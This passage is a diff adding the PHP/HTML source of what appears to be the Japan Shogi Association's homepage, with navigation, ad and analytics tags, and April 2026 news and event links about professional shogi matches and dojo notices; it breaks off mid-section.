@@ -1,0 +1,1415 @@
+<?php include($_SERVER["DOCUMENT_ROOT"]."/phplib/library/playerLink.php")?>
+<!DOCTYPE HTML>
+<html lang="ja"><!-- InstanceBegin template="/Templates/base.dwt" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta charset="utf-8">
+<meta name="keywords" content="将棋,日本将棋連盟,しょうぎ,shogi,将棋会館">
+<meta name="description" content="公益社団法人日本将棋連盟の公式サイトです。日本将棋連盟は伝統文化としての将棋の普及発展と技術向上や将棋を通じた交流親善などを目的とした公益社団法人です。">
+<title>日本将棋連盟</title>
+
+<meta property="og:title" content="日本将棋連盟">
+<meta property="og:type" content="article">
+<meta property="og:description" content="公益社団法人日本将棋連盟の公式サイトです。日本将棋連盟は伝統文化としての将棋の普及発展と技術向上や将棋を通じた交流親善などを目的とした公益社団法人です。">
+
+<meta property="og:image" content="https://www.shogi.or.jp/common/images/ogp_img.png">
+
+<link rel="alternate" type="application/atom+xml" href="https://www.shogi.or.jp/atom.xml" title="Atom">
+<link rel="stylesheet" href="/common/css/styles.css?1538721371">
+<link rel="stylesheet" href="/common/css/lowerSetting.css">
+<link rel="stylesheet" media="all" href="/common/scripts/kifu_player/kifu_player.css" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<script src="/common/scripts/jquery.js"></script>
+<script src="/common/scripts/css_browser_selector.js"></script>
+<script src="/common/scripts/fixHeight.js"></script>
+<script src="/common/scripts/tab-control.js"></script>
+<script src="/common/scripts/floatblock.js"></script>
+<script src="/common/scripts/common.js?1538721369"></script>
+<script type="text/javascript" async="async" src="//widgets.outbrain.com/outbrain.js"></script>
+<script src="/common/scripts/kifu_player/kifu_player.js" type="text/javascript"></script>
+<link rel="manifest" href="/common/scripts/manifest.json">
+<script src="/common/scripts/js/brm/brm_pf.js"></script>
+<script src="/common/scripts/js/brm/brm.js"></script>
+
+
+<link rel="stylesheet" href="/css/bxslider.css">
+<link rel="stylesheet" href="/css/home.css?v=2">
+<link rel="stylesheet" href="common/css/style.css">
+<script src="/scripts/bxslider.js"></script>
+<script src="/scripts/home.js"></script>
+
+
+<!--[if lt IE 9]> <script src="/common/scripts/html5shiv.js"></script> <![endif]-->
+<meta name="viewport" content="width=1100">
+<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+<script>
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+</script>
+<script type="text/javascript">
+var shgAd = new Object();
+shgAd.path_value = location.pathname.substr(0,40);
+shgAd.ref_value = "null";
+if (document.referrer){
+shgAd.ref_array=new Array();
+shgAd.ref_array=document.referrer.split("/"); 
+shgAd.ref_value = shgAd.ref_array[2];}
+</script>
+
+<script>
+  googletag.cmd.push(function() {
+  googletag.defineSlot('/1482203494/shogi_pc_topbanner', [[728, 90], [970, 90]], 'div-gpt-ad-1544087724462-0').addService(googletag.pubads());
+  googletag.defineSlot('/1482203494/shogi_pc_footerbanner', [[970, 90], [970, 250]], 'div-gpt-ad-1544087894932-0').addService(googletag.pubads());
+    googletag.defineSlot('/1482203494/shogi_pc_1strectangle', [[1, 1], [300, 250]], 'div-gpt-ad-1505270177229-0').addService(googletag.pubads());
+    googletag.defineSlot('/1482203494/shogi_pc_2ndrectangle', [[1, 1], [300, 250]], 'div-gpt-ad-1505270177229-1').addService(googletag.pubads());
+    googletag.defineSlot('/1482203494/shogi_pc_3rdrectangle', [[300, 250], [300, 600], [1, 1]], 'div-gpt-ad-1505270177229-2').addService(googletag.pubads());
+  googletag.defineSlot('/1482203494/shogi_pc_text_column', ['fluid'], 'div-gpt-ad-1505275057006-3').addService(googletag.pubads());
+    googletag.defineSlot('/1482203494/shogi_pc_top_middlerectangle', [[1, 1], [336, 280]], 'div-gpt-ad-1505271954315-3').addService(googletag.pubads());
+    googletag.pubads().enableSingleRequest();
+    googletag.pubads().collapseEmptyDivs();
+    googletag.pubads().setTargeting('ref', shgAd.ref_value).setTargeting('url', shgAd.path_value);
+    googletag.enableServices();
+  });
+</script>
+
+</head>
+
+<body>
+<!-- Google Tag Manager -->
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-W9B75J"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-W9B75J');</script>
+<!-- End Google Tag Manager -->
+<!-- facebook sns -->
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.6";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<!-- google sns -->
+
+<script type="text/javascript">
+  window.___gcfg = {lang: 'ja'};
+
+  (function() {
+    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+    po.src = 'https://apis.google.com/js/plusone.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+  })();
+</script>
+<div id="wrapper" class="home">
+
+<header id="gheader">
+<div class="gheaderInner">
+<h1 class="logo"><a href="/">公益社団法人 日本将棋連盟</a></h1>
+<nav id="gnav">
+<ul>
+<li><span>将棋を見る・知る</span>
+<div class="innerNav">
+<ul>
+<li><a id="news" href="/news/"><span class="gnavTxt-innerNav_01">将棋ニュース</span></a></li>
+<li><a id="event" href="/event/"><span class="gnavTxt-innerNav_02">イベント・大会</span></a></li>
+<li><a id="column" href="/column/"><span class="gnavTxt-innerNav_03">将棋コラム</span></a></li>
+<li><a id="game" href="/game/"><span class="gnavTxt-innerNav_04">対局予定・結果</span></a></li>
+<li><a id="match" href="/match/"><span class="gnavTxt-innerNav_05">棋戦（奨励会）</span></a></li>
+<li><a id="player" href="/player/"><span class="gnavTxt-innerNav_06">棋士データベース</span></a></li>
+</ul></div></li>
+<li><span>将棋を指す・教わる</span>
+<div class="innerNav">
+<ul>
+<li><a id="tournament" href="/tournament/"><span class="gnavTxt-innerNav_07">将棋大会</span></a></li>
+<li><a id="school" href="/school/"><span class="gnavTxt-innerNav_08">将棋道場・教室</span></a></li>
+<li><a id="branch" href="/branch/"><span class="gnavTxt-innerNav_09">支部・指導員</span></a></li>
+<li><a id="license" href="/license/"><span class="gnavTxt-innerNav_10">免状</span></a></li>
+<li><a id="tsumeShogi" href="/tsume_shogi/"><span class="gnavTxt-innerNav_11">詰将棋</span></a></li>
+<li><a id="knowledge" href="/knowledge/"><span class="gnavTxt-innerNav_12">将棋の基礎知識</span></a></li>
+</ul></div></li>
+<li><span>将棋連盟について</span>
+<div class="innerNav">
+<ul>
+<li><a id="about" href="/about/"><span class="gnavTxt-innerNav_13">連盟概要</span></a></li>
+<li><a id="history" href="/history/"><span class="gnavTxt-innerNav_14">将棋の歴史</span></a></li>
+<li><a id="kishikai" href="/kishikai/"><span class="gnavTxt-innerNav_15">棋士会</span></a></li>
+<li><a id="base_tokyo" href="/about/base/tokyo/"><span class="gnavTxt-innerNav_16">将棋会館のご案内</span></a></li>
+<li><a id="disclosure" href="/about/information_disclosure.html"><span class="gnavTxt-innerNav_17">情報公開</span></a></li>
+<li class="kansai"><a id="base_kansai" href="/kansai/"><span class="gnavTxt-innerNav_18">関西将棋会館</span></a></li>
+</ul></div></li>
+</ul>
+<!-- / #gnav --></nav>
+
+<ul class="headerUtilityNav">
+<li class="rss"><a id="rss" href="https://www.shogi.or.jp/atom.xml" target="_blank">RSS</a></li>
+<li><a id="contact" href="/info/">お問い合わせ</a></li>
+<li><a id="advertising" href="/advertising/">広告掲載について</a></li>
+<li><a id="kifuguideline" href="https://www.shogi.or.jp/kifuguideline/terms.html">棋譜利用のガイドライン</a></li>
+<li><a id="faq" href="/faq/">よくあるご質問</a></li>
+<li><a id="sitemap" href="/sitemap/">サイトマップ</a></li>
+</ul>
+
+<!-- / .gheaderInner --></div>
+<!-- / #gheader --></header>
+<div class="homeBgBottom">
+<div id="container">
+<main id="main">
+<section id="contents"><!-- InstanceBeginEditable name="contents" -->
+
+<!-- 盤面中継 or トップ盤面中継管理に公開中の記事がない場合はメインビジュアル -->
+<?php include($_SERVER["DOCUMENT_ROOT"] ."/inc/liveboard.html")?>
+
+
+<!--チャットボットここから-->
+<script>
+(function (c, n, s) {
+    if (c[n] === void 0) {c['ULObject'] = n;
+    c[n] = c[n] || function () {(c[n].q = c[n].q || []).push(arguments)};
+    c[n].l = 1 * new Date();var e = document.createElement('script');
+    e.async = 1;e.src = s + "/chatbot.js";
+    var t = document.getElementsByTagName('script')[0];t.parentNode.insertBefore(e, t);}
+})(window, 'ul_widget', 'https://support-widget.nakanohito.jp');
+ul_widget('init', { 'id': 1363, 'lg_id': '' });
+</script>
+
+<!--チャットボットここまで　-->　
+
+
+
+
+<div class="section03 homeContents01 top-kisen-info">
+  <h2 class="mb15"><img src="/images/home_ttl_20.png" width="692" alt="棋戦情報"></h2>
+  <div class="tabContentsA01 boxElementsA01">
+  <div class="imgLayoutElementsB02">
+  
+  
+  
+  
+  
+  
+  <figure class="image"><a href="https://www.shogi.or.jp/news/2026/04/260425_n_01.html"><img src="https://www.shogi.or.jp/news/assets_c/2026/04/news_meijin84_02-thumb-230xauto-50020.jpg" width="230" height="" class="mb5" alt=""><br>藤井聡VS糸谷 名人戦第2局</a></figure>
+  
+  
+  
+   
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  <div class="text">
+  <ul class="linkStyle01 jsNewIcoList01">
+  
+  
+  <li data-update="2026/04/24" class="typeNews"><a href="https://www.shogi.or.jp/news/2026/04/260425_n_01.html">藤井聡VS糸谷 名人戦第2局</a></li>
+  
+  
+  <li data-update="2026/04/23" class="typeTopic"><a href="https://www.shogi.or.jp/match_news/2026/04/260423_t_result_01.html">羽生VS広瀬 棋聖戦決勝Tの勝者は？</a></li>
+  
+  
+  <li data-update="2026/04/23" class="typeTopic"><a href="https://www.shogi.or.jp/match_news/2026/04/260423_t_01.html">羽生VS広瀬 棋聖戦決勝T</a></li>
+  
+  
+  <li data-update="2026/04/22" class="typeTopic"><a href="https://www.shogi.or.jp/match_news/2026/04/260422_t_result_01.html">高見VS服部 棋聖戦決勝Tの勝者は？</a></li>
+  
+  
+  <li data-update="2026/04/22" class="typeNews"><a href="https://www.shogi.or.jp/news/2026/04/260422_n_result_01.html">福間VS西山 マイナビ第2局の勝者は？</a></li>
+  
+  
+  <li data-update="2026/04/22" class="typeTopic"><a href="https://www.shogi.or.jp/match_news/2026/04/260422_t_01.html">高見VS服部 棋聖戦決勝T</a></li>
+  
+  
+  <li data-update="2026/04/22" class="typeNews"><a href="https://www.shogi.or.jp/news/2026/04/260422_n_01.html">福間VS西山 マイナビ第2局</a></li>
+  
+  
+  <li data-update="2026/04/21" class="typeTopic"><a href="https://www.shogi.or.jp/match_news/2026/04/260421_t_result_01.html">杉本和VS古賀 王位リーグの勝者は？</a></li>
+  
+  </ul>
+  <p class="linkStyle01 tar"><a href="/update/">もっと見る</a></p>
+  </div>
+  </div>
+  </div>
+</div>
+
+
+<!--広告ここから
+<div class="section03 homeContents01">
+<div id='div-gpt-ad-1505275057006-3'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1505275057006-3'); });
+</script>
+</div>
+</div>
+ 広告ここまで-->
+
+
+<div class="section03 homeContents01">
+<div class="tabElements03 jsTabElements03">
+<ul id="jsTabE01_tabNav" class="tabNav01 floatListA01Col4 fixHeight">
+<li><a href="#jsTabE01_01" class="fixHeightChild"><span><img src="/images/home_txt_tab_09_n.png" alt="最新"></span></a></li>
+<li><a href="#jsTabE01_02" class="fixHeightChild"><span><img src="/images/home_txt_tab_10_n.png" alt="メディア出演"></span></a></li>
+<li><a href="#jsTabE01_03" class="fixHeightChild"><span><img src="/images/home_txt_tab_11_n.png" alt="記録"></span></a></li>
+<li><a href="#jsTabE01_04" class="fixHeightChild"><span><img src="/images/home_txt_tab_12_n.png" alt="その他"></span></a></li>
+</ul>
+
+<div id="jsTabE01_01" class="tabContentsA01 boxElementsA01">
+<div class="imgLayoutElementsB02">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <figure class="image"><a href="https://www.shogi.or.jp/news/2026/04/53_2.html"><img src="https://www.shogi.or.jp/news/assets_c/2026/04/53shogi-taisho_thumb-thumb-230xauto-50072.jpg" width="230" height="auto" class="mb5" alt=""><br>第53回将棋大賞表彰式・昇段者免状授与式の模様</a></figure>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <div class="text">
+  <ul class="linkStyle01 jsNewIcoList01">
+  
+  <li data-update="2026/04/23"><a href="https://www.shogi.or.jp/news/2026/04/42526_84_2_vs.html">4/25・26 (土・日)囲碁将棋チャンネルで「第84期名人戦七番勝負 第2局 藤井聡太名人 vs 糸谷哲郎九段」を生中継！</a></li>
+  
+  <li data-update="2026/04/21"><a href="https://www.shogi.or.jp/news/2026/04/post_2619.html">加藤一二三九段　「お別れの会」と名誉十段追贈のお知らせ</a></li>
+  
+  <li data-update="2026/04/20"><a href="https://www.shogi.or.jp/news/2026/04/53_2.html">第53回将棋大賞表彰式・昇段者免状授与式の模様</a></li>
+  
+  <li data-update="2026/04/17"><a href="https://www.shogi.or.jp/news/2026/04/post_2620.html">糸谷哲郎八段が九段に昇段</a></li>
+  
+  </ul>
+  <p class="linkStyle01 tar"><a href="/news/">ニュースをもっと見る</a></p>
+  </div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / #jsTabE01_01 .tabContentsA01 --></div>
+
+<div id="jsTabE01_02" class="tabContentsA01 boxElementsA01">
+<div class="imgLayoutElementsB02">
+  
+  
+  
+  
+  
+  
+  
+  
+  <figure class="image"><a href="https://www.shogi.or.jp/news/2026/04/etv_3.html"><img src="https://www.shogi.or.jp/news/assets_c/2026/04/592fbe2852d16d7dac32ee12767da26b-thumb-230xauto-49995.jpg" width="230" height="auto" class="mb5" alt=""><br>「ETV特集 藤井聡太と羽生善治  対談 一手先の世界へ」が放送</a></figure>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <div class="text">
+  <ul class="linkStyle01 jsNewIcoList01">
+  
+  <li data-update="2026/04/23"><a href="https://www.shogi.or.jp/news/2026/04/42526_84_2_vs.html">4/25・26 (土・日)囲碁将棋チャンネルで「第84期名人戦七番勝負 第2局 藤井聡太名人 vs 糸谷哲郎九段」を生中継！</a></li>
+  
+  <li data-update="2026/04/13"><a href="https://www.shogi.or.jp/news/2026/04/etv_3.html">「ETV特集 藤井聡太と羽生善治  対談 一手先の世界へ」が放送</a></li>
+  
+  <li data-update="2026/04/07"><a href="https://www.shogi.or.jp/news/2026/04/32526_meijin_84_1_vs_1.html">4/8・9 (水・木)囲碁将棋チャンネルで「第84期名人戦七番勝負 第1局 藤井聡太名人 vs 糸谷哲郎八段」を生中継！</a></li>
+  
+  <li data-update="2026/04/01"><a href="https://www.shogi.or.jp/news/2026/04/vs_111.html">伊藤匠叡王VS斎藤慎太郎八段 第11期叡王戦五番勝負第1局シンガポール対局はABEMAにて放送いたします！</a></li>
+  
+  </ul>
+  <p class="linkStyle01 tar"><a href="/news/topics/media/">ニュースをもっと見る</a></p>
+  </div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / #jsTabE01_02 .tabContentsA01 boxElementsA01 --></div>
+
+<div id="jsTabE01_03" class="tabContentsA01 boxElementsA01">
+<div class="imgLayoutElementsB02">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <figure class="image"><a href="https://www.shogi.or.jp/news/2026/03/post_2613.html"><img src="https://www.shogi.or.jp/news/assets_c/2026/03/78sandan-thumb01-thumb-230xauto-49806.jpg" width="230" height="" class="mb5" alt=""><br>新四段誕生のお知らせ</a></figure>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <div class="text">
+  <ul class="linkStyle01 jsNewIcoList01">
+  
+  <li data-update="2026/04/21"><a href="https://www.shogi.or.jp/news/2026/04/post_2619.html">加藤一二三九段　「お別れの会」と名誉十段追贈のお知らせ</a></li>
+  
+  <li data-update="2026/04/17"><a href="https://www.shogi.or.jp/news/2026/04/post_2620.html">糸谷哲郎八段が九段に昇段</a></li>
+  
+  <li data-update="2026/04/13"><a href="https://www.shogi.or.jp/news/2026/04/post_2618.html">黒田尭之五段が六段に昇段</a></li>
+  
+  <li data-update="2026/04/01"><a href="https://www.shogi.or.jp/news/2026/04/post_2616.html">昇段・引退・休場棋士のお知らせ</a></li>
+  
+  </ul>
+  <p class="linkStyle01 tar"><a href="/news/">ニュースをもっと見る</a></p>
+  </div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / #jsTabE01_03 .tabContentsA01 boxElementsA01 --></div>
+
+<div id="jsTabE01_04" class="tabContentsA01 boxElementsA01">
+
+<div class="imgLayoutElementsB02">
+  
+  
+  
+  
+  <figure class="image"><a href="https://www.shogi.or.jp/news/2026/04/53_2.html"><img src="https://www.shogi.or.jp/news/assets_c/2026/04/53shogi-taisho_thumb-thumb-230xauto-50072.jpg" width="230" height="" class="mb5" alt=""><br>第53回将棋大賞表彰式・昇段者免状授与式の模様</a></figure>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <div class="text">
+  <ul class="linkStyle01 jsNewIcoList01">
+  
+  <li data-update="2026/04/20"><a href="https://www.shogi.or.jp/news/2026/04/53_2.html">第53回将棋大賞表彰式・昇段者免状授与式の模様</a></li>
+  
+  <li data-update="2025/11/19"><a href="https://www.shogi.or.jp/news/2025/11/51_388.html">第51回「将棋の日」表彰・感謝の式典の模様</a></li>
+  
+  <li data-update="2025/10/28"><a href="https://www.shogi.or.jp/news/2025/10/11_28.html">11月観戦記情報</a></li>
+  
+  <li data-update="2025/10/01"><a href="https://www.shogi.or.jp/news/2025/10/31_13.html">「第31回大山康晴賞」受賞者のお知らせ</a></li>
+  
+  </ul>
+  <p class="linkStyle01 tar"><a href="/news/">ニュースをもっと見る</a></p>
+  </div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / #jsTabE01_04 .tabContentsA01 boxElementsA01 --></div>
+
+<!-- / .jstabElements03 --></div>
+
+
+<!--PRここにいいれる↓-->
+
+<!--PRここにいいれる↑-->
+
+
+  <div class="pickupArea">
+    <div class="pickupAreaInner">
+    <p class="ttl">注目記事</p>
+    <ul class="listElementA01-5">
+<li><a href="https://www.shogi.or.jp/school/oss.html?modal=beginner-may">オンライン将棋スクール、初心者講座5月生お申し込み募集中！（応募締切:5/6）</a>
+       
+    
+   
+    
+    
+    <li data-update="2026/04/21"><a href="https://www.shogi.or.jp/event/2026/04/post_1945.html">第８４期名人戦第３局　前夜祭＆大盤解説会のお知らせ</a></li>
+    
+    <li data-update="2026/04/21"><a href="https://www.shogi.or.jp/event/2026/04/84_3.html">第８４期名人戦第５局　前夜祭＆大盤解説会のお知らせ</a></li>
+    
+    <li data-update="2026/03/06"><a href="https://www.shogi.or.jp/news/2026/03/_kinone_2026_1.html">日本将棋連盟 「棋の音（KINONE）」 2026年春夏期のお知らせ ― 道…</a></li>
+    
+    <li data-update="2026/03/05"><a href="https://www.shogi.or.jp/news/2026/03/post_2518.html">免状についてのお知らせ</a></li>
+    
+    <li data-update="2026/03/01"><a href="https://www.shogi.or.jp/news/2026/03/3220.html">第32回升田幸三賞・第20回名局賞　投票受付開始！</a></li>
+    
+    
+    </ul>
+    </div>
+  </div>
+<!-- / .section03 --></div>
+
+<div class="section03 homeContents11">
+
+<?php @include($_SERVER["DOCUMENT_ROOT"] ."/inc/top_today_schedule.html");?>
+
+<?php @include($_SERVER["DOCUMENT_ROOT"] ."/phplib/library/app.php");?>
+
+
+<div class="inner">
+<ul class="top-match-btn">
+  <li class="top-match-btn__item"><a href="/game/" class="top-match-btn__link">対局結果</a></li>
+  <li class="top-match-btn__item"><a href="/player/" class="top-match-btn__link">棋士データ</a></li>
+  <li class="top-match-btn__item"><a href="/game/record/" class="top-match-btn__link">成績・<br>ランキング</a></li>
+  <li class="top-match-btn__item"><a href="/match/" class="top-match-btn__link">棋戦</a></li>
+  <li class="top-match-btn__item"><a href="/match/shoreikai/" class="top-match-btn__link">奨励会</a></li>
+  <li class="top-match-btn__item"><a href="/match/training/" class="top-match-btn__link">研修会</a></li>
+</ul>
+<!-- / .inner --></div>
+<!-- / .homeContents11 --></div>
+
+
+
+<div class="section03 top-event-tabs">
+  <div class="tabElements03 jsTabElements05">
+    <ul id="jsTabE03_tabNav" class="tabNav01 floatListA01Col2 fixHeight">
+      <li><a href="#jsTabE03_02" class="fixHeightChild"><span><img src="/images/home_txt_tab_07_n.png" alt="イベント・大会募集情報"></span></a></li>
+      <li><a href="#jsTabE03_01" class="fixHeightChild"><span><img src="/images/home_txt_tab_13_n.png" alt="イベントカレンダー"></span></a></li>
+    </ul>
+    <div id="jsTabE03_02" class="tabContentsA01 boxElementsA01">
+	<div class="imgLayoutElementsB02">
+		
+        
+        
+        
+        <figure class="image"><a href="https://www.shogi.or.jp/event/2026/04/2026_6.html"><img src="https://www.shogi.or.jp/event/assets_c/2026/04/shogifes_logo-thumb-230xauto-50134.jpg" width="230" height="auto" class="mb5" alt=""><br>「将棋フェス2026」イベント詳細発表のお知らせ</a></figure>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+
+        <div class="text">
+        <ul class="linkStyle01 jsNewIcoList01">
+        <!--<li><a href="https://www.shogi.or.jp/event/2025/07/4_53.html">　</a></li>-->
+        
+        <li data-update="2026/04/24"><a href="https://www.shogi.or.jp/event/2026/04/2026_6.html">「将棋フェス2026」イベント詳細発表のお知らせ</a></li>
+        
+        <li data-update="2026/04/24"><a href="https://www.shogi.or.jp/event/2026/04/2026_5.html">詰将棋解答選手権2026　初級戦と一般戦の結果</a></li>
+        
+        <li data-update="2026/04/23"><a href="https://www.shogi.or.jp/event/2026/04/114_1.html">第11期叡王戦第4局 前夜祭・大盤解説会のお知らせ</a></li>
+        
+        <li data-update="2026/04/22"><a href="https://www.shogi.or.jp/event/2026/04/5533.html">第55回全国支部将棋対抗戦・名人戦東地区大会、第33回全国シニア将棋名人戦東地区大会【開催報告】</a></li>
+        
+        <li data-update="2026/04/22"><a href="https://www.shogi.or.jp/event/2026/04/post_1946.html">5/6(水・祝)【駒テラス西参道】 指導対局会　小窪新四段・川村新四段・古井新四段</a></li>
+        
+        <li data-update="2026/04/22"><a href="https://www.shogi.or.jp/event/2026/04/15jcom_3.html">「第15回J:COM杯 3月のライオン子ども将棋大会」参加者募集開始</a></li>
+        
+        <li data-update="2026/04/21"><a href="https://www.shogi.or.jp/event/2026/04/post_1945.html">第８４期名人戦第３局　前夜祭＆大盤解説会のお知らせ</a></li>
+        
+        </ul>
+        <p class="linkStyle01 tar"><a href="/event/cat47/">イベントをもっと見る</a></p>
+        </div>
+      </div>
+	</div>
+    <div id="jsTabE03_01" class="tabContentsA01 boxElementsA01">
+      <?php @include($_SERVER["DOCUMENT_ROOT"] ."/inc/active_event.html");?>
+    </div>
+  </div><!-- /.jsTabElements03 -->
+</div><!-- /.section03 -->
+
+<!-- 将棋コラム最新記事 -->
+<?php include($_SERVER["DOCUMENT_ROOT"] ."/column/inc_top_list.html")?>
+
+<!-- <div class="section03 homeContents06">
+<h2><img src="/images/home_ttl_04.png" width="693" height="44" alt="メディア情報"></h2>
+<div class="tableElements12Wrap mb15">
+<table class="tableElements12">
+<tbody>
+
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/04/42526_84_2_vs.html">4/25・26 (土・日)囲碁将棋チャンネルで「第84期名人戦七番勝負 第2局 藤井聡太名人 vs 糸谷哲郎九段」を生中継！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/04/etv_3.html">「ETV特集 藤井聡太と羽生善治  対談 一手先の世界へ」が放送</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/04/32526_meijin_84_1_vs_1.html">4/8・9 (水・木)囲碁将棋チャンネルで「第84期名人戦七番勝負 第1局 藤井聡太名人 vs 糸谷哲郎八段」を生中継！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/04/vs_111.html">伊藤匠叡王VS斎藤慎太郎八段 第11期叡王戦五番勝負第1局シンガポール対局はABEMAにて放送いたします！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/03/32526_alsok_75_7_vs.html">3/25・26 (水・木)囲碁将棋チャンネルで「ALSOK 杯第75期王将戦 七番勝負 第 7 局 藤井聡太王将 vs 永瀬拓矢九段」を生中継！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/03/31819_alsok_75_6_vs.html">3/18・19 (水・木)囲碁将棋チャンネルで「ALSOK 杯第75期王将戦 七番勝負 第6局 藤井聡太王将 vs 永瀬拓矢九段」を生中継！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/03/nhk_26.html">加藤一二三九段　追悼番組のお知らせ｜NHKラジオ深夜便 （再放送）</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/02/31_51_3_vs.html">3/1 (日)囲碁将棋チャンネルで「第51期棋王戦コナミグループ杯 五番勝負 第 3 局 藤井聡太棋王 vs 増田康宏八段」を生中継！</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/02/84a.html">将棋界の一番熱い日をライブで！第84期順位戦A級最終局配信のお知らせ</a></td></tr>
+
+<tr><td><a href="https://www.shogi.or.jp/news/2026/02/21718_alsok75_4_vs.html">2/17・18 (火・水)囲碁将棋チャンネルで「ALSOK杯第75期王将戦七番勝負 第4局 藤井聡太王将 vs 永瀬拓矢九段」を生中継！</a></td></tr>
+
+
+</tbody></table>
+</div>
+<p class="linkStyle01 tar"><a href="/news/topics/media/">メディア情報をもっと見る</a></p>
+</div> -->
+
+
+<div class="section03 homeContents13 fixHeight">
+<div class="inner">
+<h3 class="ttl tac"><img src="/images/home_ttl_16.png" width="264" height="21" alt="【将棋会館 棋の音道場のご案内】"></h3>
+<div class="textArea fixHeightChild01">
+<!--<p>将棋道場の詳細は<a href="/dojo/outline/">こちら</a></p>-->
+<p>棋の音道場について詳細は<a href="https://www.shogi.or.jp/dojo/outline/new_dojo.html" target="_blank">こちら</a></p>
+<p>将棋会館 棋の音道場Ｘは<a href="https://twitter.com/shogidojo" target="_blank">こちら</a></p>
+<p>子供将棋スクール渋谷校Ｘは<a href="https://twitter.com/kodomo_shogi81" target="_blank">こちら</a></p>
+<p>子供将棋スクールについては<a href="https://www.shogi.or.jp/dojo/#anc01">こちら</a></p>
+<p>渋谷校開校日は<a href="https://www.shogi.or.jp/dojo/s_kodomo/#schedule">こちら</a><br><span class="fc03"><small>無料体験募集中！</small></span></p>
+<p><a href="https://www.youtube.com/watch?v=cyoNVr3-CL8](https://www.youtube.com/watch?v=cyoNVr3-CL8)\&t=491s" target="_blank">東京会館案内（英語版）</a></p>
+<!-- / .textArea --></div>
+<div class="block fixHeightChild02">
+<p class="subTtl"><em>お知らせ・イベント情報</em></p>
+<ul class="linkStyle01">
+<!--<li class="fwb"><a href="/dojo/s_bunkou/index_machida.html">子供将棋スクール町田校</a>　<a href="/dojo/s_bunkou/index_yokohama.html">横浜校</a>の入会金無料＆プレゼント
+キャンペーン！</li>-->
+<li><a href="/news/2026/03/4_47.html">4月の営業についてはこちら</a></li>
+<li><a href="/dojo/s_beginner/">ビギナーズセミナーのお知らせ</a></li>
+<li><a href="/dojo/s_gachinko/index.html">土曜子供入門教室のお知らせ</a></li>
+
+</ul>
+<!-- / .block --></div>
+<!-- / .inner --></div>
+
+
+<div class="inner">
+<h3 class="ttl tac"><img src="/images/home_ttl_18.png" width="272" height="20" alt="【関西・将棋会館道場のご案内】"></h3>
+<div class="textArea fixHeightChild01">
+<!--<p>臨時休業のお知らせ（販売・道場）<a href="/news/2020/05/post_1885.html">こちら</a></p>-->
